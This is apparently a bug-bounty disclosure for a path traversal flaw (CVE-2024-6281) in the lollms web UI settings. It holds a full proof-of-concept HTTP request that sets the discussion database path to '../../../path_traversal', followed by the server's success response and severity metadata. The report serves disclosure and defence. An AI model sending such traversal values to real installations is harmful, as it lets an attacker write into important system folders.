@@ -1,0 +1,65 @@
+Title: Path Traversal in Settings in parisneo/lollms
+
+Proof of Concept: 
+Step 1: Access Settings, change, Edit:  Database path.
+
+```"discussion_db_name":"../../../path_traversal"```
+
+*Step 2: Click Apply changes to change.
+
+HTTP Request
+
+POST /apply_settings HTTP/1.1
+Host: localhost:9600
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/json
+Content-Length: 6001
+Origin: http://localhost:9600
+Connection: keep-alive
+Referer: http://localhost:9600/settings/
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=1
+
+{"client_id":"pfjZ4XZiZ9mHJjAZAAAF","config":{"activate_audio_infos":true,"activate_internet_search":false,"activate_lollms_server":true,"activate_mistralai_emulator":true,"activate_ollama_emulator":true,"activate_openai_emulator":true,"activate_skills_lib":false,"active_personality_id":0,"active_stt_service":"None","active_tti_service":"None","active_ttm_service":"None","active_tts_service":"None","allowed_origins":[],"app_custom_logo":"","asr_base_url":"http://localhost:9000","asr_enable":false,"audio_auto_send_input":true,"audio_in_language":"en-US","audio_out_voice":null,"audio_pitch":1,"audio_silenceTimer":5000,"auto_read":false,"auto_save":true,"auto_show_browser":true,"auto_speak":false,"auto_sync_bindings":true,"auto_sync_extensions":true,"auto_sync_models":true,"auto_sync_personalities":true,"auto_title":false,"auto_update":true,"binding_name":"anthropic_llm","comfyui_base_url":"http://127.0.0.1:8188/","comfyui_model":"v1-5-pruned-emaonly.ckpt","copy_to_clipboard_add_all_details":false,"ctx_size":4090,"current_language":"english","dall_e_generation_engine":"dall-e-3","dall_e_key":"","data_vectorization_activate":true,"data_vectorization_build_keys_words":true,"data_vectorization_chunk_size":512,"data_vectorization_force_first_chunk":false,"data_vectorization_make_persistance":false,"data_vectorization_method":"tfidf_vectorizer","data_vectorization_nb_chunks":2,"data_vectorization_overlap_size":128,"data_vectorization_put_chunk_informations_into_context":false,"data_vectorization_save_db":true,"data_vectorization_sentense_transformer_model":"all-MiniLM-L6-v2","data_vectorization_visualize_on_vectorization":false,"data_visualization_method":"PCA","debug":false,"debug_log_file_path":"","default_negative_prompt":"(((text))), (((ugly))), (((duplicate))), ((morbid)), ((mutilated)), out of frame, extra fingers, mutated hands, ((poorly drawn hands)), ((poorly drawn face)), (((mutation))), (((deformed))), blurry, ((bad anatomy)), (((bad proportions))), ((extra limbs)), cloned face, (((disfigured))), ((extra arms)), (((extra legs))), mutated hands, (fused fingers), (too many fingers), (((long neck))), ((watermark)), ((robot eyes))","diffusers_model":"PixArt-alpha/PixArt-Sigma-XL-2-1024-MS","diffusers_offloading_mode":"sequential_cpu_offload","discussion_db_name":"../../../path_traversal","discussion_prompt_separator":"!@>","elastic_search_service":false,"elastic_search_url":"http://localhost:9200","enable_comfyui_service":false,"enable_fooocus_service":false,"enable_lollms_service":false,"enable_motion_ctrl_service":false,"enable_ollama_service":false,"enable_petals_service":false,"enable_sd_service":false,"enable_vllm_service":false,"end_ai_header_id_template":": ","end_ai_message_id_template":"","end_header_id_template":": ","end_user_header_id_template":": ","end_user_message_id_template":"","extensions":[],"fooocus_base_url":"http://localhost:7860","force_accept_remote_access":false,"fun_mode":false,"hardware_mode":"nvidia-tensorcores","headless_server_mode":false,"host":"localhost","internet_activate_search_decision":false,"internet_nb_search_pages":3,"internet_quick_search":false,"internet_vectorization_chunk_size":512,"internet_vectorization_nb_chunks":2,"internet_vectorization_overlap_size":128,"lollms_access_keys":"","lollms_base_url":"http://localhost:1234","max_n_predict":4096,"max_summary_size":512,"media_on":false,"midjourney_key":"","min_n_predict":1024,"model_name":"","model_type":null,"model_variant":null,"motion_ctrl_base_url":"http://localhost:7861","n_threads":8,"negative_boost":null,"negative_prompt_generation_prompt":"Generate negative prompt for the following prompt. negative prompt is a set of words that describe things we do not want to have in the generated image.","num_experts_per_token":2,"ollama_base_url":"http://localhost:11434","openai_tts_key":"","openai_tts_model":"tts-1","openai_tts_voice":"alloy","openai_whisper_key":"","openai_whisper_model":"whisper-1","override_personality_model_parameters":false,"pdf_latex_path":"","personalities":["generic/lollms"],"petals_base_url":"http://localhost:8064","petals_device":"cuda","petals_model_path":"TinyLlama/TinyLlama-1.1B-Chat-v1.0","port":9600,"positive_boost":null,"repeat_last_n":40,"repeat_penalty":1.2,"sd_base_url":"http://localhost:7860","seed":-1,"separator_template":"\t\n!@>system\n","show_code_of_conduct":true,"show_news_panel":true,"skills_lib_database_name":"default","start_ai_header_id_template":"!@>","start_header_id_template":"!@>","start_user_header_id_template":"!@>","stt_activate_word_detection":false,"stt_buffer_size":10,"stt_channels":1,"stt_gain":1,"stt_input_device":0,"stt_listening_threshold":1000,"stt_rate":44100,"stt_silence_duration":2,"stt_sound_threshold_percentage":10,"stt_word_detection_file":null,"system_message_template":"system","temperature":0.9,"top_k":50,"top_p":0.95,"tts_output_device":0,"turn_on_code_execution":true,"turn_on_code_validation":true,"turn_on_language_validation":true,"turn_on_open_file_validation":true,"turn_on_send_file_validation":true,"turn_on_setting_update_validation":true,"use_ai_generated_negative_prompt":false,"use_model_name_in_discussions":false,"use_negative_prompt":true,"use_user_informations_in_discussion":false,"use_user_name_in_discussions":false,"user_avatar":"","user_description":"","user_name":"user","version":111,"vllm_gpu_memory_utilization":0.9,"vllm_max_model_len":4096,"vllm_max_num_seqs":256,"vllm_model_path":"TinyLlama/TinyLlama-1.1B-Chat-v1.0","vllm_url":"http://localhost:8000","whisper_activate":false,"whisper_model":"base","xtts_base_url":"http://localhost:8020","xtts_current_language":"en","xtts_current_voice":null,"xtts_enable":false,"xtts_enable_text_splitting":true,"xtts_length_penalty":1,"xtts_repetition_penalty":5,"xtts_speed":1,"xtts_stream_chunk_size":100,"xtts_temperature":0.75,"xtts_top_k":50,"xtts_top_p":0.85,"xtts_use_deepspeed":false,"xtts_use_streaming_mode":true,"personality_category":"generic","personality_folder":"lollms"}}
+
+HTTP Response
+
+HTTP/1.1 200 OK
+date: Sun, 23 Jun 2024 17:13:23 GMT
+server: uvicorn
+content-length: 15
+content-type: application/json
+access-control-allow-credentials: true
+access-control-allow-origin: http://localhost:9600
+vary: Origin
+
+{"status":true}
+
+Step 3: Restart LOLLMS, see ``Discussions``` has had its save path changed.
+
+Impact: 
+Attackers will change the path of Discussions according to their wishes. Can write to important folders of the system.
+
+CVE ID: CVE-2024-6281
+Status: (published)
+Vulnerability Type: CWE-440: Expected Behavior Violation
+Severity: High (7.3)
+Attack Vector: Local
+Attack Complexity: Low
+Privileges Required: None
+User Interaction: None
+Scope: Unchanged
+Confidentiality: Low
+Integrity: Low
+Availability: High
+Registry: Other
+Affected Version: Laste
+Visibility: Public
+Status: Fixed
+Disclosure Bounty: $450
+Fix Bounty: $112.5
